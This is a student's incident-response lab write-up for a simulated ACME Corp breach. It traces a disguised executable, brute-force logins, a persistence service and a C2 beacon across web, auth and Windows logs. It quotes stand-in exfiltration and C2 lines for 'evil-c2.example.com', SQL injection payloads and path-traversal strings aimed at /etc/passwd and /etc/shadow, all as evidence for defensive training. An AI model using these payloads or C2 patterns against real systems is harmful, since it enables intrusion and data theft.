# Day 8 Lab — DFIR & Log Investigation

**Scenario:** ACME Corp has been breached. I analysed a suspicious file recovered from the compromised server and three log sources (web, auth, Windows) to identify the attacker, rebuild the timeline and find the hidden flag.

**Environment:** Kali Linux, using `file`, `strings`, `xxd`, `grep`
**Lab directory:** `~/Desktop/Foundation Labs/day09-dfir/` → `evidence/`, `logs/`

---

## Key Findings at a Glance

| Item | Finding |
|---|---|
| Attacker IP | `10.13.37.42` |
| Disguised malware | `evidence/report.pdf`, really a Windows executable (`MZ` header): the `WindowsUpdateHelper` implant |
| Tools | sqlmap 1.7 (SQLi), password brute forcing, custom implant `svc_update.exe` |
| C2 server | `evil-c2.example.com` |
| Persistence | Service `WindowsUpdateHelper` → `C:\Temp\svc_update.exe` (auto start, LocalSystem) |
| Flag | `CODED{1nc1d3nt_cr4ck3d}` |

---

## Part A — Suspicious File Analysis

### Task 1: Verify the File

```bash
cd evidence
file report.pdf
```

**Output:**
```
report.pdf: MS-DOS executable, MZ for MS-DOS
```

**Answer:** The file is **not a PDF**. `file` ignores the extension and reads the content, which identifies it as a DOS/Windows executable. The `.pdf` extension is a disguise to make malware look like a harmless document.

### Task 2: Extract Intelligence

```bash
strings report.pdf
strings report.pdf | grep -v '!"#$%&'    # filter out the filler-byte noise
```

**Output (filtered):**
```
WindowsUpdateHelper Service v2.1
Connecting to C2 server...
http://evil-c2.example.com/beacon
http://evil-c2.example.com/exfil?data=
Exfiltration complete
Target: ACME-CORP-DC01
User: Administrator
Persistence: HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdateHelper
svc_update.exe -connect evil-c2.example.com
Password spray completed
Dumping credentials from LSASS...
Upload path: /tmp/acme_db_export.sql.gz
```

**Answer:** The file is the attacker's implant. It's the same `WindowsUpdateHelper` / `svc_update.exe` that later shows up as a malicious service in the Windows logs (Part D).

| Category | Intelligence |
|---|---|
| **Infrastructure** | C2 domain `evil-c2.example.com`, with endpoints `/beacon` (check-in) and `/exfil?data=` (data theft over HTTP) |
| **Target** | `ACME-CORP-DC01` (the domain controller) using the `Administrator` account |
| **Persistence** | Registers itself as a Windows service at `HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdateHelper`, named to look like a legitimate update component |
| **Credential access** | Password spraying, plus dumping credentials from LSASS memory |
| **Exfiltration** | Stages the database export at `/tmp/acme_db_export.sql.gz` and sends it to the C2 |

**Intentions:** gain domain-level access, persist on the host, steal credentials and exfiltrate ACME's database. This matches the `exported_database` action in the auth log (Part C) and the `-connect evil-c2.example.com` command line in Sysmon (Part D).

> Caveat: these are strings embedded in the binary, i.e. what the malware is *built to do*. The logs confirm the C2 connection and persistence. LSASS dumping and the exfil upload aren't directly observed in the logs provided.

### Task 3: Examine the Raw Bytes

```bash
xxd report.pdf | head
```

**Output (first line):**
```
00000000: 4d5a 0001 0203 0405 0607 0809 0a0b 0c0d  MZ..............
```

**Answer:** The first two bytes, `4D 5A`, are ASCII **"MZ"**, the magic bytes (file signature) for DOS/Windows executables (PE files such as `.exe`/`.dll`). "MZ" stands for Mark Zbikowski, one of the format's designers. A genuine PDF would start with `25 50 44 46` = `%PDF`.

> Note: the bytes after `MZ` just count upward (`00 01 02 … 9d`), so this is a crafted lab sample. Only the signature is real, which is why `file` reports "MS-DOS executable" and not "PE32 executable".

---

## Part B — Web Server Logs (`logs/web_server_attack.log`)

### Task 4: Find the Attacker

```bash
cat web_server_attack.log | grep 10.13.37.42
```

**Answer:** The attacker IP is **`10.13.37.42`**. Unlike the normal traffic, it requests sensitive/non-existent paths, injects SQL syntax and attempts directory traversal.

### Task 5: Classify the Attack

| Phase | Time (15 Mar 2026, UTC) | Technique | Requests | Result |
|---|---|---|---|---|
| Recon / forced browsing | 15:05:00 – 15:05:45 | Probing `/admin`, `/wp-admin`, `/phpmyadmin`, `/.env`, `/config.php`, `/backup.sql`, `/.git/config`, `/.htaccess`, etc. | 16 | Mostly 404; `robots.txt` & `sitemap.xml` returned 200 |
| SQL injection | 15:10:00 – 15:11:12 | Auth bypass (`admin'--`, `' OR 1=1--`), boolean-based, UNION-based (`UNION SELECT username,password FROM users`), version fingerprinting (`@@version`), column-count probing (`UNION SELECT NULL,NULL,NULL`) | 10 | All 200, identical 1523-byte response |
| Path traversal | 15:15:00 – 15:15:20 | `../../etc/passwd`, `/etc/shadow`, `/etc/hosts`, URL-encoded `..%2f` | 5 | All 403 (blocked) |

**Tool:** **sqlmap 1.7**, identified from the User-Agent `sqlmap/1.7` on the SQLi requests. The recon and traversal requests used a generic `Mozilla/5.0` UA, so sqlmap is attributed only to the SQLi phase.

**SQLi vs IDOR:** the `/api/v1/users?id=1'…` request is SQL injection, not IDOR. IDOR would be changing a legitimate value (e.g. `id=1` → `id=2`) to read another user's data. Here the `'` breaks out of the query and SQL is appended.

**Did SQLi succeed?** There's no evidence that it did. Every payload returned the same 1523-byte page, which suggests the app responded identically regardless of input. The attacker's actual way in was the brute force in Part C.

### Task 6: Build the Web Timeline

```bash
grep -c 10.13.37.42 web_server_attack.log
```

**Output:** `31`

**Answer:**
- **Start:** 15 Mar 2026, 15:05:00 UTC
- **End:** 15 Mar 2026, 15:15:20 UTC
- **Suspicious requests:** **31** (16 recon + 10 SQLi + 5 traversal)

---

## Part C — Authentication Logs (`logs/auth_bruteforce.log`)

### Task 7: Identify the Brute Force

```bash
grep "AUTH FAILED" auth_bruteforce.log | grep -c 10.13.37.42
```

**Output:** `120` failed attempts

**Answer:**
- **120 failed logins** for user `admin` from `10.13.37.42`, roughly **one per second** (automated brute force/password guessing).
- **One success:** `[2026-03-15 14:32:01] AUTH SUCCESS - User: admin - IP: 10.13.37.42 - Method: password`.
- The admin account had a guessable password and no lockout or rate limiting.

### Task 8: Post-Compromise Activity

```
[2026-03-15 14:32:05] ADMIN ACTION - User: admin - IP: 10.13.37.42 - Action: viewed_user_list
[2026-03-15 14:32:10] ADMIN ACTION - User: admin - IP: 10.13.37.42 - Action: exported_database
[2026-03-15 14:32:18] ADMIN ACTION - User: admin - IP: 10.13.37.42 - Action: modified_user_permissions
[2026-03-15 14:32:25] ADMIN ACTION - User: admin - IP: 10.13.37.42 - Action: created_api_key
```

**Answer:** Within 24 seconds of logging in, the attacker:
1. **Viewed the user list** (discovery)
2. **Exported the database** (data exfiltration)
3. **Modified user permissions** (privilege escalation / tampering)
4. **Created an API key** (persistence, a way back in that survives a password reset)

---

## Part D — Windows Event Logs (`logs/windows_events.txt`)

### Task 9: Correlate the Events

| Time (15 Mar 2026) | Event ID | What happened |
|---|---|---|
| ~14:25 – 14:25:56 | 4625 | Repeated failed network logons (Type 3) to `Administrator` from `10.13.37.42`. Brute force |
| 14:26:05 | 4624 | **Successful** network logon as `Administrator` from `10.13.37.42` |
| 14:26:30 | 7045 | Service **`WindowsUpdateHelper`** installed → `C:\Temp\svc_update.exe`, auto start, runs as **LocalSystem** |
| 14:26:35 | Sysmon 1 | `services.exe` launches `svc_update.exe -connect evil-c2.example.com` (C2 beacon) |
| 14:26:42 | Sysmon 1 | `svc_update.exe` spawns `cmd.exe /c echo CODED{…} > C:\Temp\status.log` |
| 14:26:50 | Sysmon 1 | `ipconfig /all` (network discovery) |
| 14:26:55 | Sysmon 1 | `net user /domain` (domain account discovery) |
| 14:27:02 | Sysmon 1 | `nltest /dclist:acme.local` (domain controller discovery) |

**Answer:** The same IP (`10.13.37.42`) brute forced the local `Administrator` account over the network and logged in. It then installed a malicious service disguised as a Windows Update component for persistence, which launched an implant connecting to the C2 server `evil-c2.example.com` with SYSTEM privileges. From there the attacker ran internal reconnaissance (network config, domain users, domain controllers) to prepare for lateral movement in the `acme.local` domain.

### Task 10: Find the Flag

**Found in:** Sysmon Event ID 1, 14:26:42, the command line of a `cmd.exe` spawned by `svc_update.exe`:
```
cmd.exe /c echo CODED{1nc1d3nt_cr4ck3d} > C:\Temp\status.log
```

**Flag:** `CODED{1nc1d3nt_cr4ck3d}`

---

## Full Attack Timeline (all sources, 15 Mar 2026)

| Time | Source | Activity |
|---|---|---|
| 14:25 – 14:26:05 | Windows | Brute force of `Administrator` → success (4625 → 4624) |
| 14:26:30 – 14:27:02 | Windows | Persistence service, C2 beacon, flag dropped, internal discovery |
| up to 14:32:01 | Auth log | 120 failed logins for `admin` → success |
| 14:32:05 – 14:32:25 | Auth log | Viewed users, exported DB, modified permissions, created API key |
| 15:05:00 – 15:05:45 | Web log | Recon / forced browsing (16 requests) |
| 15:10:00 – 15:11:12 | Web log | SQL injection with sqlmap 1.7 (10 requests) |
| 15:15:00 – 15:15:20 | Web log | Path traversal attempts, blocked 403 (5 requests) |

> **Timezone caveat:** the web log is explicitly UTC (`+0000`). The auth and Windows logs carry no timezone. The ordering above assumes all three use the same clock. If they don't, the sequence may differ, and in a real investigation this would need to be confirmed before finalising the timeline.

---

## Optional: Better Alternatives (not used in this lab)

These weren't part of my investigation. They're more efficient ways to do the same tasks, kept here for learning.

### 1. Find the odd IP without knowing it in advance: `awk` + `sort` + `uniq`

```bash
awk '{print $1}' web_server_attack.log | sort | uniq -c | sort -rn
```

| Piece | What it does |
|---|---|
| `awk '{print $1}'` | Prints only the 1st whitespace-separated field of each line, which is the client IP in Apache logs |
| `sort` | Groups identical IPs together (`uniq` only collapses *adjacent* duplicates, so sorting first is required) |
| `uniq -c` | Collapses duplicates and prefixes each with a count |
| `sort -rn` | Sorts by that count, **n**umerically, in **r**everse (biggest first) |

**Why it's better:** it gives a ranked list of every IP and how many requests each made, so a noisy attacker jumps to the top without you having to scroll the log. Example shape of output:
```
     31 10.13.37.42
      6 192.168.1.15
      4 192.168.1.22
```

**Variation:** spot attack tools by counting User-Agents (in Apache combined format, the UA is the 6th field when splitting on `"`):
```bash
awk -F'"' '{print $6}' web_server_attack.log | sort | uniq -c | sort -rn
```

### 2. See the whole multi-line event: `grep -A` / `-B` / `-C`

Windows events span several lines, but the IP only appears on the `Source IP:` line. A plain `grep` returns just that one line and loses the Event ID, time and account.

```bash
grep -B 6 -A 1 10.13.37.42 windows_events.txt   # 6 lines Before + 1 line After each match
grep -A 8 "7045" windows_events.txt             # the service-install event and its details
grep -C 3 "AUTH SUCCESS" auth_bruteforce.log    # 3 lines of Context on both sides
```

| Flag | Meaning |
|---|---|
| `-A n` | Show **n** lines **A**fter each match |
| `-B n` | Show **n** lines **B**efore each match |
| `-C n` | Show **n** lines of **C**ontext either side |

**Why it's better:** the third command, for example, shows the last few failed attempts, the success and the first admin actions in one view, which is exactly the "what happened next" question from Task 8.

### 3. Search every file at once: `grep -r`

```bash
grep -r "CODED{" .        # run from the day09-dfir folder
```

- `-r` = **r**ecursive: searches every file in the current folder and its subfolders.
- Output is prefixed with the filename, so you see *where* the match is:
  ```
  ./logs/windows_events.txt:  Command Line:    cmd.exe /c echo CODED{1nc1d3nt_cr4ck3d} > C:\Temp\status.log
  ```

**Why it's better:** finds the flag in one command instead of reading through each log. Add `-n` to also get the line number. If the flag were encoded (base64/hex), this would find nothing, and that alone would tell you to look for encoded strings.

### 4. Other quick wins

```bash
grep "AUTH FAILED" auth_bruteforce.log | head -1      # first failed attempt → start of brute force
grep -c "4625" windows_events.txt                     # count of failed Windows logons
grep 10.13.37.42 auth_bruteforce.log | grep -v "AUTH FAILED"   # everything the attacker did EXCEPT failures
```

- `head -1` / `tail -1`: first/last matching line, which is useful for timeline start and end times.
- `grep -v`: invert the match. The last command hides the 120 failures and leaves only the success and admin actions.

---

## Key Takeaways

- Never trust a file extension. Verify with `file`, `strings` and `xxd`.
- Magic bytes reveal a file's true type (`MZ` = executable, `%PDF` = PDF).
- `grep` (filtering by IP or keyword, `-c` to count, `-v` to exclude noise) is enough to find an attacker in noisy logs.
- The User-Agent string can reveal attack tools (`sqlmap/1.7`).
- Correlating web, auth and Windows logs by IP and timestamp gives the full story that no single log shows.
- Attackers disguise persistence as legitimate system components (`WindowsUpdateHelper`, `svc_update.exe`).
